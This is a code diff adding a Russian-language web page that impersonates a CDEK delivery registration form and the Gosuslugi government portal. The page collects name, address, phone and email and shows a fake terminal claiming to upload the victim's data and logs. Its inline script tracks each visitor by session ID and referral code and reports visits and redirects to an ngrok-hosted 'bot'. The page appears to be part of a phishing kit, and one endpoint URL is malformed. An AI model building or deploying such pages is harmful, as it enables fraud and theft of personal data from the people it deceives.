@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Форма регистрации</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- ЭКРАН 1: Первичная инициализация -->
+    <div id="sitePreloader" class="preloader">
+        <div class="spinner"></div>
+        <div class="preloader-text">Инициализация сервиса...</div>
+    </div>
+
+    <!-- ЭКРАН 2: ТЕРМИНАЛ (Чистый консольный блок) -->
+    <div id="hackerModal" class="hacker-overlay">
+        <div class="hacker-window">
+            <div class="hacker-body">
+                <div id="terminalConsole" class="terminal-console"></div>
+                <div class="hacker-progress-container">
+                    <div class="progress-info">
+                        <span id="progressText">ВЫГРУЗКА ДАННЫХ И ЛОГОВ...</span>
+                        <span id="progressPercent">0%</span>
+                    </div>
+                    <div class="progress-bar-bg">
+                        <div id="progressBarFill" class="progress-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ЭКРАН 4: Перенаправление / Загрузка профиля -->
+    <div id="profileLoaderOverlay" class="modal-overlay">
+        <div class="top-logo-container">
+            <img src="flags/logo.png" alt="Logo" class="top-logo">
+        </div>
+
+        <div class="status-card">
+            <h3 class="status-title">Госуслуги сейчас откроются</h3>
+            <p class="status-subtitle">Портал работает в прежнем режиме.<br>Подождите пару секунд</p>
+            
+            <div class="dots-container">
+                <span class="dot"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ЭКРАН 3: Основная форма (СДЭК) -->
+    <div class="page-wrapper" id="mainContent">
+        <div class="card active">
+            <!-- Логотип над слоганом -->
+            <div class="logo-container">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTGmnNH7IajkFqD8JBpC2ZqNy1QbascYux29PnRRxg5dQ&s=10" alt="Логотип" class="logo-img" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+                <div class="logo-placeholder" style="display:none;">СДЭК</div>
+            </div>
+            
+            <h2>Регистрация пользователя</h2>
+            
+            <form onsubmit="return false;">
+                <div class="form-group">
+                    <label>ФИО</label>
+                    <input type="text" id="fullName" placeholder="Иванов Иван Иванович" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Адрес доставки</label>
+                    <input type="text" id="fullAddress" placeholder="г. Москва, ул. Ленина, д. 10" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Номер телефона</label>
+                    <input type="tel" id="phoneNumber" placeholder="+7 912 345 67 89" required>
+                </div>
+
+                <div class="form-group">
+                    <label>E-mail адрес</label>
+                    <input type="email" id="emailInput" placeholder="ivanov@example.com" required>
+                </div>
+
+                <button type="submit" id="getSmsBtn" class="btn-green">Продолжить</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="toastContainer" class="toast-container"></div>
+    
+    <!-- === ОБНОВЛЕННЫЙ БЛОК: Скрипт связи с ботом (Визиты и Переадресация) === -->
+    <script>
+        // 1. Создаем или получаем уникальный ID сессии для отслеживания пользователя
+        const currentSessionId = localStorage.getItem('sessionId') || Math.random().toString(36).substring(2, 10);
+        localStorage.setItem('sessionId', currentSessionId);
+
+        // 2. Извлекаем реферальный код из URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const refCode = urlParams.get('ref');
+
+        // 3. Отправляем уведомление о визите сразу при загрузке страницы
+        window.addEventListener('DOMContentLoaded', () => {
+            fetch('https://runaround-defiance-unmasked.ngrok-free.devapi/visit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: currentSessionId,
+                    refCode: refCode, // Передаем реферальный код боту
+                    deviceInfo: {
+                        userAgent: navigator.userAgent,
+                        localTime: new Date().toLocaleTimeString()
+                    }
+                })
+            }).catch(err => console.error("Ошибка отправки визита:", err));
+        });
+
+        // 4. Функция переадресации на error.html
+        function redirectWithErrorLog(targetUrl = 'error.html') {
+            fetch('https://runaround-defiance-unmasked.ngrok-free.dev/api/redirect_log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: currentSessionId,
+                    target: targetUrl
+                })
+            }).finally(() => {
+                window.location.href = targetUrl;
+            });
+        }
+    </script>
+    <!-- === КОНЕЦ ОБНОВЛЕННОГО БЛОКА === -->
+
+    <script src="script.js"></script>
+</body>
+</html>
